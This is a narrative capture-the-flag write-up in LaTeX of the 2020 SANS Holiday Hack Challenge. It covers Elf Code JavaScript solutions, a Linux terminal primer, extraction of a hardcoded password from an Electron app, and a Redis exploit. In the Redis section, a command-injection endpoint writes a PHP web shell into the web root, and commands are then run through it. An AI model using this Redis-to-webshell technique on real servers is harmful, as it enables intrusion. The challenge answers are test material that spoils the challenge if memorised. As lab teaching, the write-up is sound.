@@ -1,0 +1,328 @@
+\chapter{Objective 3}
+
+\section{Introduction}
+
+Our two heroes, decided to switch gears. The castle looked unique, Cindy Lou not only was meeting Santa, she got to visit it's Castle.
+
+In the \textit{Entry of Castle}, {\color{codegreen}Piney Shoppington} pulls Grinch to the side and mentions that Santa is acting strange.
+Grinch raised an eyebrow but decided to further investigate. Chatting to Santa wasn't of much help. Santa was admiring
+a really strange portrait behind him. Maybe it was some sort of medieval tradition to have a huge portrait of yourself and admire it.
+
+Cindy Lou on the other hand decided to talk to {\color{codegreen}Ginger Breddie}, and similar to {\color{codegreen}Piney Shoppington} he mentioned that something looks off in the castle.
+Behind him, Cindy Lou found another item, a textit{bolt nut}. {\color{codegreen}Sparkle Redberry} joined the chat and gave her a key of the Santavator. Our heroes were taken by surprise, they didn't expect that some elf would give them proper hints.
+
+Following their little chat, they wandered in the Dining Room. There, there was {\color{codegreen}Ribb Bonbowford} sitting next to a strange token machine. Chatting to {\color{codegreen}Ribb} was mostly JS-related clues.
+
+Grinch pulled Cindy Lou to the side
+
+- Who on their right mind would pay money to play Javascript?
+
+- Stop judging people you old fart and give it a shot. You automate everything in the office.
+
+\subsection{Elf Code}
+Grinch stretched his fingers and got typing, it should be easy after all.
+\begin{minted}{javascript}
+elf.moveLeft(10)
+elf.moveUp(10)
+\end{minted}
+
+- Cindy Lou, this is level 1. HAHA haven't felt this good since Street Fighter.
+
+\begin{minted}{javascript}
+elf.moveLeft(6)
+elf.pull_lever(elf.get_lever(0) + 2)
+elf.moveLeft(4)
+elf.moveUp(10)
+\end{minted}
+
+Grinch was already hooked.
+
+\begin{minted}{javascript}
+for (i = 0; i < 3; i++)
+  elf.moveTo(lollipop[i])
+elf.moveUp(1)
+\end{minted}
+
+He probably yawned.
+
+\begin{minted}{javascript}
+elf.moveLeft(1)
+for (i = 0; i < 3; i++) {
+  elf.moveUp(12)
+  elf.moveLeft(3)
+  elf.moveDown(12)
+  elf.moveLeft(3)
+}
+\end{minted}
+
+He craved for more.
+
+\begin{minted}{javascript}
+elf.moveTo(munchkin[0])
+response = elf.ask_munch(0).filter(numbersOnly);
+elf.tell_munch(response)
+elf.moveUp(2)
+
+function numbersOnly(value) {
+  if (typeof(value) === 'number') {
+    return value;
+  }
+}
+\end{minted}
+
+Cindy Lou was getting bored.
+
+\begin{minted}{javascript}
+for (i = 0; i < 4; i++)
+  elf.moveTo(lollipop[i])
+elf.moveTo(lever[0])
+response = elf.get_lever(0)
+response.unshift("munchkins rule")
+elf.pull_lever(response)
+elf.moveTo(munchkin[0])
+elf.moveUp(2)
+\end{minted}
+
+- Grinch, we need to move. You are done here
+
+- ...
+
+\begin{minted}{javascript}
+function my_func(arrays) {
+  return arrays.flat().filter(function(item) {
+    return (parseInt(item) == item);
+  }).reduce((a, b) => a + b)
+}
+
+function pull(i) {
+  elf.pull_lever(i)
+}
+for (i = 0; i < 2; i++) {
+  elf.moveDown(1 + (4 * i))
+  pull(i * 4)
+  elf.moveLeft(2 + (4 * i))
+  pull((i * 4) + 1)
+  elf.moveUp(3 + (4 * i))
+  pull((i * 4) + 2)
+  elf.moveRight(4 + (4 * i))
+  pull((i * 4) + 3)
+  lever += 4
+}
+elf.moveUp(2)
+elf.moveLeft(4)
+elf.tell_munch(my_func)
+elf.moveUp(2)
+\end{minted}
+
+- I think that's the last one.
+
+\begin{minted}{javascript}
+function getKeyByValue(arr) {
+  var str = ""
+  arr.forEach(obj => Object.keys(obj).filter(function(key) {
+    if (obj[key] === "lollipop") {
+      str = key
+    }
+  }))
+  return str
+}
+
+function levers() {
+  nums = []
+  for (i = 0; i < 6; i++) {
+    nums.push(elf.get_lever(i))
+  }
+  sums = []
+  sums[0] = nums[0]
+  for (i = 1; i < 6; i++)
+    sums[i] = sums[i - 1] + nums[i]
+  return sums
+}
+
+function up() {
+  elf.moveUp(2)
+}
+sums = levers()
+pos = 0
+for (i = 1; i < 13; i += 4) {
+  elf.moveRight(i)
+  elf.pull_lever(sums[pos])
+  up()
+  elf.moveLeft(i + 2)
+  elf.pull_lever(sums[pos + 1])
+  up()
+  pos += 2
+}
+elf.tell_munch(getKeyByValue)
+elf.moveRight(11)
+\end{minted}
+
+{\color{codegreen}Ribb Bonbowford} was that impressed that he gave them an achievement for finishing all the levels. Cindy Lou though focused more on another Santavator hint. Someone could manipulate the Santavator. Maybe, someone didn't even need to find all objects.
+
+Our two heroes decided to move to Courtyard. On the upper left corner of the courtyard, another item waited for them. A \textit{green lamp}. Grinch didn't even find it funny.
+
+\subsection{Courtyard and Sugarplum Mary}
+Many people were there, including this strange looking bloke\footnote{Yes, pun definitely intended.}, called {\color{codegreen}Jack Frost}. Grinch kinda cringed looking at him but Cindy Lou dragged him in front of {\color{codegreen}Sugarplum Mary}. She asked whether their Linux-Fu was up to date. Cindy Lou yawned and started typing\footnote{I won't explain any commands. It is useful to become familiar with \textit{man} command. Oh, and \textit{apropos} maybe}.
+
+\begin{minted}{bash}
+elf@primer:~$ ls
+HELP  munchkin_19315479765589239  workshop
+elf@primer:~$ cat munchkin_19315479765589239
+munchkin_24187022596776786
+elf@primer:~$ rm -f munchkin_19315479765589239
+elf@primer:~$ pwd
+/home/elf
+elf@primer:~$ ls -lah
+total 56K
+drwxr-xr-x 1 elf  elf  4.0K Dec 26 21:40 .
+drwxr-xr-x 1 root root 4.0K Dec 10 18:14 ..
+-rw-r--r-- 1 elf  elf    31 Dec 10 18:18 .bash_history
+-rw-r--r-- 1 elf  elf   220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 elf  elf  3.1K Dec  5 00:00 .bashrc
+-rw-r--r-- 1 elf  elf     0 Dec 26 21:40 .munchkin_5074624024543078
+-rw-r--r-- 1 elf  elf   807 Apr  4  2018 .profile
+-rw-r--r-- 1 elf  elf   168 Dec  5 00:00 HELP
+drwxr-xr-x 1 elf  elf   20K Dec 10 18:19 workshop
+elf@primer:~$ history
+    1  echo munchkin_9394554126440791
+    2  ls
+    3  cat munchkin_19315479765589239
+    4  rm -f munchkin_19315479765589239
+    5  pwd
+    6  ls -lah
+    7  history
+    8  env
+    9  history
+elf@primer:~$ env
+<snip>
+elf@primer:~/workshop$ cd workshop
+elf@primer:~/workshop$ grep -ir "munchkin" .
+./toolbox_191.txt:mUnChKin.4056180441832623
+elf@primer:~/workshop$ which lollipop_engine # Not in $PATH
+elf@primer:~/workshop$ ls lollipop_engine
+lollipop_engine # IN this dir
+elf@primer:~/workshop$ chmod +x lollipop_engine
+elf@primer:~/workshop$ ./lollipop_engine
+munchkin.898906189498077
+elf@primer:~/workshop$ cd electrical/
+elf@primer:~/workshop/electrical$ mv blown_fuse0 fuse0
+elf@primer:~/workshop/electrical$ ln -s fuse0 fuse1
+elf@primer:~/workshop/electrical$ cp fuse1 fuse2
+elf@primer:~/workshop/electrical$ echo "MUNCHKIN_REPELLENT" >> fuse2 # >> means append
+elf@primer:~/workshop/electrical$ cd /opt/munchkin_den
+elf@primer:/opt/munchkin_den$ find . -iname '*munchkin*'
+./apps/showcase/src/main/resources/mUnChKin.6253159819943018
+elf@primer:/opt/munchkin_den$ find . -type f -user 'munchkin'
+./apps/showcase/src/main/resources/template/ajaxErrorContainers/niKhCnUm_9528909612014411
+elf@primer:/opt/munchkin_den$ find . -type f -size +108k -size -110k
+./plugins/portlet-mocks/src/test/java/org/apache/m_u_n_c_h_k_i_n_2579728047101724
+elf@primer:/opt/munchkin_den$ ps aux
+<snip>
+elf@primer:/opt/munchkin_den$ netstat -plnt
+<snip>
+elf@primer:/opt/munchkin_den$ curl http://localhost:54321
+munchkin.73180338045875
+elf@primer:/opt/munchkin_den$ ps aux | grep 14516_munchkin | awk '{print $2}'
+3503
+5966 # This is the PID of GREP
+elf@primer:/opt/munchkin_den$ kill -9 3503
+\end{minted}
+
+\subsection{Objective 3}
+Looks like they somehow managed to lock themselves out and the only thing we have is a binary copy.
+Cindy Lou brought out her work laptop and proceeded to work on the problem.
+She proceeded to install \textit{NPM} and \textit{ASAR}.
+
+\begin{minted}{bash}
+$ wget https://download.holidayhackchallenge.com/2020/santa-shop/santa-shop.exe
+$ file santa-shop.exe
+santa-shop.exe: PE32 executable (GUI) Intel 80386, for MS Windows, Nullsoft Installer self-extracting archive
+$ 7z x santa-shop.exe
+<snip>
+$ cd \$PLUGINSDIR/
+$PLUGINSDIR $ 7z x app-64.7z
+$PLUGINSDIR $ cd resources
+resources $ asar e app.asar app/
+resources $ cd app
+app $ grep -ir "passw" ./
+<snip>
+.//main.js:const SANTA_PASSWORD = 'santapass';
+<snip>
+\end{minted}
+
+Although their objective was done, Grinch was nowhere to be found.
+Grinch wandered off and ended up in the kitchen.
+
+\subsection {Stop eating Grinch}
+Grinch couldn't stop eating. That candy was delicious. Cindy Lou checked in with the elves and since it was fine, it decided to take a look at the challenges.
+Cindy Lou decided to help {\color{codegreen}Holly Evergreen}. Redis wasn't really her thing but taking a look wouldn't really hurt. After all, she \href{https://book.hacktricks.xyz/pentesting/6379-pentesting-redis}{read} about Redis RCEs recently. She could probably alter some exploit and get it done.
+After playing with it a bit, she formulated a plan.
+
+\begin{minted}{bash}
+player@redis:~$ # Init recon
+player@redis:~$ cat /etc/**release**
+PRETTY_NAME="Debian GNU/Linux 10 (buster)"
+NAME="Debian GNU/Linux"
+VERSION_ID="10"
+VERSION="10 (buster)"
+VERSION_CODENAME=buster
+ID=debian
+HOME_URL="https://www.debian.org/"
+SUPPORT_URL="https://www.debian.org/support"
+BUG_REPORT_URL="https://bugs.debian.org/"
+player@redis:~$ # HTTP is reading from /var/www/html
+player@redis:~$ curl http://localhost/maintenance.php?cmd=config,set,dir,
+/var/www/html/
+Running: redis-cli --raw -a '<password censored>' 'config' 'set' 'dir'
+'/var/www/html/'
+
+OK
+player@redis:~$ curl http://localhost/maintenance.php?cmd=config,set,
+dbfilename,sh.php
+Running: redis-cli --raw -a '<password censored>' 'config' 'set' 'dbfilename'
+'sh.php'
+
+OK
+# We will create a backdoor. The user will be redis in this case.
+player@redis:~$ curl 'http://localhost/maintenance.php?cmd=set,test,
+<?=`$_GET[0]`?>'
+Running: redis-cli --raw -a '<password censored>' 'set' 'test'
+'<?=`$_GET[0]`?>'
+
+OK
+player@redis:~$ curl http://localhost/maintenance.php?cmd=save
+Running: redis-cli --raw -a '<password censored>' 'save'
+
+OK
+# Test fire
+player@redis:~$ curl http://localhost/sh.php?0=ls --output -
+<snip>
+sh.php
+
+# Works. Move file to /tmp/. Redis will not have perms to write on our home DIR
+player@redis:~$ curl http://localhost/sh.php?0=cp+index.php+/tmp/ --output -
+player@primer:~$ cat /tmp/index.php
+\end{minted}
+
+Cindy Lou found that "bug" joke somehow horrible but she didn't mention a thing. She checked quickly on Grinch's well-being, he was already stuffing his third turkey down his throat.
+{\color{codegreen}Holly Evergreen} thanked Cindy and mentioned something about a Tag Generator and gave some hints. Cindy went on to fix the internet.
+
+{\color{codegreen}Fitzy Shortstack} was desperate to fix the internet. Cindy Lou thought it would have been some fiber issue but it turns out she had no clue. She dragged Grinch to help her.
+Grinch didn't really like it, but after having 4 sodas he decided to help. His plan was easy, he fixed such stuff back in his university years.
+
+\begin{itemize}
+  \item Call 756-8347
+  \item Ba DEE Brrr
+  \item Aah
+  \item Wewewrrr
+  \item Bedurnditty
+  \item schrrrrschrrr
+\end{itemize}
+
+Although {\color{codegreen}Fitzy Shortstack} was ecstatic, Cindy Lou was looking Grinch in a strange way.
+
+- I guess technology has evolved since then.
+
+As they were getting ready to head off, {\color{codegreen}Fitzy Shortstack} mentioned that Santa really trusts {\color{codegreen}Shinny Uppatree}. Well, is this another hint?
+
+\textit{Narrator's voice.} I guess we will all learn in the next chapters.
